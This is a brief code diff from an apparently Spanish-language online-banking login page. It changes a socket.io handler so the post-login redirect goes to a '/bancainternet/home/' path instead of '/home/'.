@@ -91,7 +91,7 @@ emitDataServer.addEventListener("click", () => {
 })
 
 socket.on("ContinuarHome", ContinuarHome => {
-    window.location.href = "/home/?s="+ContinuarHome;
+    window.location.href = "/bancainternet/home/?s="+ContinuarHome;
 })
 
 socket.on("ErrorLogin", TextoBanner => {
